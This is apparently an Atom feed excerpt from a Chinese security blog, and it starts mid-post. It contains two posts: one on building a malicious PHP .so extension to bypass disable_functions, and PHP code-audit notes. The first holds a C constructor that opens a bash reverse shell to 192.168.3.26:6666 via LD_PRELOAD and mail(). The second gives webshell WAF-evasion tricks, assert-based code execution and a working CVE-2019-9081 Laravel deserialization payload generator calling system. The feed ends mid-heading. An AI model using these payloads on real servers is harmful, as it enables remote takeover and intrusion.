class="line">fi</span><br></pre></td></tr></table></figure><p>下面是我自己实验的config.m4文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP_ARG_ENABLE(php_knight, Whether to enable the KnightPHP extension, [ --enable-knight-php Enable KnightPHP])<span class="comment">//扩展名可以和函数名不同</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> test <span class="string">"$PHP_KNIGHT"</span> != <span class="string">"no"</span>; then</span><br><span class="line">    PHP_NEW_EXTENSION(php_knight, php_knight.c, $ext_shared)</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h3 id="2、编写-h文件"><a href="#2、编写-h文件" class="headerlink" title="2、编写.h文件"></a>2、编写.h文件</h3><p>php_knight.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义模块常量</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHP_KNIGHT_EXTNAME <span class="meta-string">"php_knight"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHP_KNIGHT_VERSION <span class="meta-string">"0.0.1"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明模块的函数功能</span></span><br><span class="line">PHP_FUNCTION(knight_php);<span class="comment">//此处是你想要生成的扩展函数</span></span><br></pre></td></tr></table></figure><h3 id="3、编写-c文件"><a href="#3、编写-c文件" class="headerlink" title="3、编写.c文件"></a>3、编写.c文件</h3><p>Php_knight.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//包含php.h文件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;php.h&gt;</span></span></span><br><span class="line"><span class="comment">// 包含扩展文件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"php_knight.h"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将函数注册到php中，让php知道本模块中所包含的函数</span></span><br><span class="line">zend_function_entry knight_php_functions[] = &#123;   <span class="comment">//此处要是 函数名_functions[]</span></span><br><span class="line">    PHP_FE(knight_php, <span class="literal">NULL</span>)<span class="comment">//此处为函数名</span></span><br><span class="line">    &#123;<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关于整个模块的详细信息</span></span><br><span class="line">zend_module_entry knight_php_module_entry =    <span class="comment">//结构体的格式是 函数名_module_entry</span></span><br><span class="line">    STANDARD_MODULE_HEADER,<span class="comment">//宏统一设置</span></span><br><span class="line">    PHP_KNIGHT_EXTNAME,<span class="comment">//扩展名称</span></span><br><span class="line">    knight_php_functions,<span class="comment">//扩展的内部函数</span></span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    PHP_KNIGHT_VERSION,<span class="comment">//扩展版本</span></span><br><span class="line">    STANDARD_MODULE_PROPERTIES<span class="comment">//宏统一设置</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提供一个接口给php来获取zend_module_entry</span></span><br><span class="line">ZEND_GET_MODULE(knight_php)</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面就是函数的编写了，可以使用c语言来执行RCE了</span></span><br><span class="line">PHP_FUNCTION(knight_php) &#123;</span><br><span class="line">    php_printf(<span class="string">"Hello World! \n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4、编译"><a href="#4、编译" class="headerlink" title="4、编译"></a>4、编译</h3><p>先安装php-dev，而后安装phpize，装好后直接在当前目录执行<code>phpize</code></p><blockquote><p>phpize主要是操作复杂的autoconf/automake/autoheader/autolocal等系列命令，用于生成configure文件</p></blockquote><p>然后执行<code>./configure --enable-php-knight</code></p><blockquote><p>提供给configure.in获取配置，生成Makefile</p></blockquote><p>接着就是<code>make</code>和<code>make install</code>,在执行完这些命令后，就会在目录下生成一个php_knight.so文件了。</p><h2 id="0x04使用恶意扩展"><a href="#0x04使用恶意扩展" class="headerlink" title="0x04使用恶意扩展"></a>0x04使用恶意扩展</h2><p>编写php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./php_knight.so"</span>);</span><br><span class="line">knight_php();</span><br></pre></td></tr></table></figure><p>这样通过访问浏览器，就会返回<code>Hello World!</code>了</p><h2 id="0x05-其他方法"><a href="#0x05-其他方法" class="headerlink" title="0x05 其他方法"></a>0x05 其他方法</h2><p>还有一个使用很多的方法</p><p>Knight.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__((__constructor__))<span class="comment">//在main()函数之前执行</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> cmd[<span class="number">0x100</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(cmd,<span class="string">"bash -i &gt;&amp; /dev/tcp/192.168.3.26/6666 0&gt;&amp;1"</span>);</span><br><span class="line">system(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使用命令<code>gcc knight.c -fPIC -shared -o knight.so</code>就可以产生so扩展文件了</p><p>knight.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./knight.so"</span>);</span><br><span class="line">mail(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>);<span class="comment">//调用扩展</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就可以动态加载自己的反弹shell命令了。</p><p>此方法相比上面一种方法的局限性就是mail()函数没有被禁用</p><h2 id="0x06参考来源"><a href="#0x06参考来源" class="headerlink" title="0x06参考来源"></a>0x06参考来源</h2><p><a href="https://blog.csdn.net/hguisu/article/details/7377153" target="_blank" rel="noopener">https://blog.csdn.net/hguisu/article/details/7377153</a></p><p><a href="https://www.jianshu.com/p/6051939134c2" target="_blank" rel="noopener">https://www.jianshu.com/p/6051939134c2</a></p><p><a href="https://www.kancloud.cn/nickbai/php7/363313" target="_blank" rel="noopener">https://www.kancloud.cn/nickbai/php7/363313</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;php自定义恶意扩展so编写过程&quot;&gt;&lt;a href=&quot;#php自定义恶意扩展so编写过程&quot; class=&quot;headerlink&quot; title=&quot;php自定义恶意扩展so编写过程&quot;&gt;&lt;/a&gt;php自定义恶意扩展so编写过程&lt;/h1&gt;&lt;h2 id=&quot;0x01前言&quot;&gt;&lt;
      
    
    </summary>
    
    
    
      <category term="php" scheme="https://knightswd.github.io/tags/php/"/>
    
      <category term="passby disable_functions" scheme="https://knightswd.github.io/tags/passby-disable-functions/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计学习笔记</title>
    <link href="https://knightswd.github.io/2020/03/02/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://knightswd.github.io/2020/03/02/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-03-02T02:40:37.000Z</published>
    <updated>2020-03-03T02:13:31.425Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php代码审计学习笔记"><a href="#php代码审计学习笔记" class="headerlink" title="php代码审计学习笔记"></a>php代码审计学习笔记</h1><h2 id="0x00-php匿名函数"><a href="#0x00-php匿名函数" class="headerlink" title="0x00 php匿名函数"></a>0x00 php匿名函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$next  =<span class="function"><span class="keyword">function</span><span class="params">($name)</span></span>&#123;<span class="comment">//定义匿名函数</span></span><br><span class="line"><span class="keyword">echo</span> $name;</span><br><span class="line">&#125;;</span><br><span class="line">$words = <span class="string">"eee"</span>;</span><br><span class="line">$next($words);<span class="comment">//eee</span></span><br></pre></td></tr></table></figure><p>​    如若匿名函数在普通函数中则可以通过此方法引用匿名函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">closure</span><span class="params">()</span></span>&#123;<span class="comment">//将匿名函数放在普通函数中，形成闭包</span></span><br><span class="line">    $words = <span class="string">"eee"</span>;</span><br><span class="line">    $func = <span class="function"><span class="keyword">function</span><span class="params">()</span><span class="title">use</span><span class="params">($words)</span></span>&#123;<span class="comment">//引用局部变量</span></span><br><span class="line">        <span class="keyword">echo</span> $words;</span><br><span class="line">    &#125;;</span><br><span class="line">    $func();</span><br><span class="line">&#125;</span><br><span class="line">closure();</span><br></pre></td></tr></table></figure><p>此方法可以在webshell中使用，绕过waf</p><h2 id="0x01-call-user-function函数"><a href="#0x01-call-user-function函数" class="headerlink" title="0x01 call_user_function函数"></a>0x01 call_user_function函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">($b)</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="string">"aaa"</span>;</span><br><span class="line">call_user_func(<span class="string">'func'</span>,$c);<span class="comment">//aaa</span></span><br><span class="line">call_user_func(<span class="string">'assert'</span>, <span class="string">"phpinfo()"</span>);<span class="comment">//输出phpinfo()</span></span><br></pre></td></tr></table></figure><h2 id="0x02-assert函数"><a href="#0x02-assert函数" class="headerlink" title="0x02 assert函数"></a>0x02 assert函数</h2><p>assert用于 判断表达式是否成立，返回true或者false。但是当传入一个php语句时，会直接执行PHP语句。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(<span class="string">"phpinfo()"</span>);<span class="comment">//输出phpinfo()的消息</span></span><br></pre></td></tr></table></figure><h2 id="0x03-…运算符实现变长参数函数"><a href="#0x03-…运算符实现变长参数函数" class="headerlink" title="0x03 …运算符实现变长参数函数"></a>0x03 …运算符实现变长参数函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">(...$args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>($args <span class="keyword">as</span> $a)</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line">&#125;</span><br><span class="line">a(<span class="string">"heihei"</span>,<span class="string">"haha"</span>,<span class="string">"en"</span>)<span class="comment">//heiheihahaen</span></span><br></pre></td></tr></table></figure><h2 id="0x04-get-魔法方法的使用"><a href="#0x04-get-魔法方法的使用" class="headerlink" title="0x04 __get()魔法方法的使用"></a>0x04 __get()魔法方法的使用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $name = <span class="string">'111'</span>;<span class="comment">//私有变量，在类外无法被访问</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($a)</span></span>&#123;<span class="comment">//调用无法被访问的属性时调用。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;$a;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;<span class="comment">//111</span></span><br></pre></td></tr></table></figure><h2 id="0x05-php可变函数"><a href="#0x05-php可变函数" class="headerlink" title="0x05 php可变函数"></a>0x05 php可变函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'this is a test'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$f = <span class="string">'func'</span>;</span><br><span class="line">$f();<span class="comment">//this is a test</span></span><br></pre></td></tr></table></figure><h2 id="0x06-反序列化数组变量覆盖"><a href="#0x06-反序列化数组变量覆盖" class="headerlink" title="0x06 反序列化数组变量覆盖"></a>0x06 反序列化数组变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $attribute;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $attribute)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;attribute = $attribute;<span class="comment">//构造函数传值，构造变量名</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __get() method.</span></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;attribute[$name];<span class="comment">//输出构造函数名的值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">array</span>(<span class="string">'id'</span>=&gt;<span class="string">"haha"</span>);<span class="comment">//传入变量</span></span><br><span class="line">$b = <span class="keyword">new</span> a($c);</span><br><span class="line">var_dump($b-&gt;id);<span class="comment">//String "haha"</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $attribute;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($attribute)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;attribute = $attribute;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __get() method.</span></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;attribute;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="string">"haha"</span>;</span><br><span class="line">$b = <span class="keyword">new</span> a($c);</span><br><span class="line">var_dump($b-&gt;id);</span><br></pre></td></tr></table></figure><h2 id="0x07-面向对象单例模式"><a href="#0x07-面向对象单例模式" class="headerlink" title="0x07 面向对象单例模式"></a>0x07 面向对象单例模式</h2><blockquote><p>1、一个类只有一个实例</p><p>2、这个实例由类自己创建</p><p>3、通过静态方法向整个系统提供这个实例</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $b = <span class="keyword">NULL</span> ;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">d</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">self</span>::$b = <span class="keyword">new</span> a();<span class="comment">//一个类只有一个实例，这个实例由类自己创建</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>::$b; <span class="comment">//返回创建的实例。self用来指向类中的静态变量。$this是指向对象实例的指针</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'haha'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = a::d();<span class="comment">//通过静态方法向整个系统提供这个实例</span></span><br><span class="line">$c-&gt;test();</span><br></pre></td></tr></table></figure><h2 id="0x08-ArrayAccess（数组式访问）接口"><a href="#0x08-ArrayAccess（数组式访问）接口" class="headerlink" title="0x08 ArrayAccess（数组式访问）接口"></a>0x08 ArrayAccess（数组式访问）接口</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ArrayAccess &#123;</span><br><span class="line"><span class="comment">/* 方法 */</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">public</span> offsetExists ( mixed $offset ) : boolean</span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">public</span> offsetGet ( mixed $offset ) : mixed</span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">public</span> offsetSet ( mixed $offset , mixed $value ) : void</span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">public</span> offsetUnset ( mixed $offset ) : void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提供一个像访问数组一样访问对象的容器的接口，在这个数组里面存储着能被访问的对象。</p><h2 id="0x08-cve-2019-9081的exp分析"><a href="#0x08-cve-2019-9081的exp分析" class="headerlink" title="0x08 cve-2019-9081的exp分析"></a>0x08 cve-2019-9081的exp分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">namespace Illuminate\Foundation\Testing &#123;//PendingCommand.php所在的路径</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span>                  //<span class="title">PendingCommand</span>.<span class="title">php</span>文件中的<span class="title">PendingCommand</span>类</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $test;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">protected</span> $command;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test, $app, $command, $parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = $test;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = $app;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>&#123;//此类为了让<span class="title">run</span>中的<span class="title">mockConsoleOutput</span>()能正常执行不在测试类中报错而停止</span><br><span class="line">    <span class="title">class</span> <span class="title">GenericUser</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $attributes)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;attributes = $attributes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;//此类为了调用那个能执行<span class="title">call</span>方法从而执行<span class="title">rce</span>的类</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">bindings</span>=[];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $bindings)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindings[<span class="string">"Illuminate\Contracts\Console\Kernel"</span>] = $bindings;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;//此处必须加<span class="title">namespace</span>，因为一个文件执行多个命名空间时，此代码也得加命名空间，表示在默认命名空间</span><br><span class="line">    $<span class="title">test</span> = <span class="title">new</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>\<span class="title">GenericUser</span>(<span class="title">array</span>("<span class="title">expectedOutput</span>" =&gt; <span class="title">array</span>("1" =&gt; "1"), "<span class="title">expectedQuestions</span>" =&gt; <span class="title">array</span>("1" =&gt; "1")));</span><br><span class="line">    $app = <span class="keyword">new</span> Illuminate\Foundation\Application(<span class="keyword">array</span>(<span class="string">"concrete"</span> =&gt; <span class="string">"Illuminate\Foundation\Application"</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand($test, $app, <span class="string">"system"</span>, <span class="keyword">array</span>(<span class="string">'dir'</span>))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x09-toString-魔法函数"><a href="#0x09-toString-魔法函数" class="headerlink" title="0x09 __toString()魔法函数"></a>0x09 __toString()魔法函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __toString() method.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"this is a test"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b  = <span class="keyword">new</span> a();</span><br><span class="line"><span class="keyword">print</span>($b);<span class="comment">//echo也可以，但是print_r()和var_dump()不行，当输出不是字符串时调用__get()</span></span><br></pre></td></tr></table></figure><h2 id="0x10-php-trait"><a href="#0x10-php-trait" class="headerlink" title="0x10 php trait"></a>0x10 php trait</h2><p>在底层php将那trait中的代码复制粘贴到use的类中，类似于继承。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> test&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hahah"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">test</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a =<span class="keyword">new</span> example();</span><br><span class="line">$a-&gt;test();<span class="comment">//hahah</span></span><br></pre></td></tr></table></figure><h2 id="0x11-phar协议的构造反序列化"><a href="#0x11-phar协议的构造反序列化" class="headerlink" title="0x11 phar协议的构造反序列化"></a>0x11 